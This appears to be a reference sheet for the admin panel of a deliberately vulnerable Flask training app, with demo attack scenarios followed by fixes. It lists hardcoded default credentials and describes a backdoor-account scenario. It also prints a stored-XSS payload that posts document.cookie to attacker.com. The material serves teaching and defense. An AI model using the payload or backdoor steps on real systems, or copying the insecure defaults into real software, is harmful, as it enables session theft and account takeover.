# Admin Panel Quick Reference

## Admin Login
- **Username**: `admin`
- **Password**: `admin123`

## Admin Routes

### Admin Dashboard
**URL**: `/admin`

View system statistics:
- Total users count
- Number of administrators
- Total payments in system
- Total feedback items

Quick actions available from dashboard.

### User Management
**URL**: `/admin/users`

Features:
- View all registered users in a table
- See each user's:
  - ID, Username, Full Name, Email
  - Admin status (badge indicator)
  - Account creation date
- Action buttons for each user (except yourself):
  - **Make Admin** - Grant admin privileges
  - **Revoke Admin** - Remove admin privileges
  - **Delete** - Remove user and all their data

### Create User
**URL**: `/admin/create-user`

Form fields:
- Username (required, unique)
- Email (required, unique)
- Full Name (required)
- Password (required)
- Admin checkbox (optional) - Grant admin on creation

### Toggle Admin Privileges
**URL**: `/admin/toggle-admin/<user_id>` (POST)

- Toggles admin status for a specific user
- Cannot modify your own admin status
- Redirects back to user management page

### Delete User
**URL**: `/admin/delete-user/<user_id>` (POST)

- Permanently deletes a user
- Also deletes all associated:
  - Payments
  - Feedback/comments
- Cannot delete yourself
- Requires confirmation dialog

## Security Features

### Protection Mechanisms
1. **@admin_required decorator** - Ensures only admins can access admin routes
2. **Self-protection** - Can't delete yourself or remove your own admin rights
3. **Flash messages** - User feedback for all actions
4. **Confirmation dialogs** - JavaScript confirm before destructive actions

### Vulnerabilities to Demonstrate
Even with admin protection, the system is still vulnerable to:

1. **XSS Cookie Theft**
   - Admin session cookies are not HttpOnly
   - XSS attack can steal admin session
   - Attacker gets full admin access

2. **CSRF Attacks**
   - No CSRF tokens on forms
   - Could trick admin into performing actions
   - Forms could be submitted from external sites

3. **Stored XSS in Admin Context**
   - If admin views feedback with XSS payload
   - Script runs with admin privileges
   - Could manipulate admin actions

## Demo Scenarios

### Scenario 1: Grant Admin to Regular User
1. Log in as `admin`
2. Go to `/admin/users`
3. Click "Make Admin" for Alice
4. Log out and log in as Alice
5. Show Alice now has admin panel access

### Scenario 2: Create Backdoor Account
1. Log in as admin (or with stolen admin session)
2. Go to `/admin/create-user`
3. Create user: `backdoor` / `secret123` with admin checked
4. New admin account created
5. Attacker can log in with persistent access

### Scenario 3: XSS to Admin Cookie Theft
1. As regular user, submit feedback with XSS:
   ```html
   <script>
   fetch('http://attacker.com/steal', {
     method: 'POST',
     body: document.cookie
   });
   </script>
   ```
2. When admin views feedback page, script executes
3. Admin's session cookie is sent to attacker
4. Attacker uses cookie to impersonate admin
5. Attacker creates backdoor account or modifies users

### Scenario 4: Mass Privilege Escalation
1. Attacker with admin access (via XSS or other means)
2. Creates multiple admin accounts
3. Grants admin to all existing users
4. Complete system compromise

## Best Practices (How to Fix)

### 1. Enable HttpOnly Cookies
```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # For HTTPS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

### 2. Add CSRF Protection
```python
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```

### 3. Implement Content Security Policy
```python
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

### 4. Add Audit Logging
```python
# Log all admin actions
def log_admin_action(action, target, details):
    conn = get_db()
    conn.execute(
        'INSERT INTO audit_log (admin_id, action, target, details, timestamp) VALUES (?, ?, ?, ?, ?)',
        (current_user.id, action, target, details, datetime.now())
    )
    conn.commit()
```

### 5. Implement Multi-Factor Authentication
- Require 2FA for admin accounts
- Use time-based one-time passwords (TOTP)
- Email or SMS verification for sensitive actions

### 6. Rate Limiting
- Limit admin action frequency
- Prevent automated attacks
- Use Flask-Limiter or similar

### 7. Session Timeout
```python
from datetime import timedelta
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
```

## Navigation

When logged in as admin, you'll see:
- Regular user menu items
- **🛡️ Admin** link in the navigation bar (purple/violet color)
- Clicking opens the admin dashboard
- All admin pages have breadcrumb navigation back to dashboard
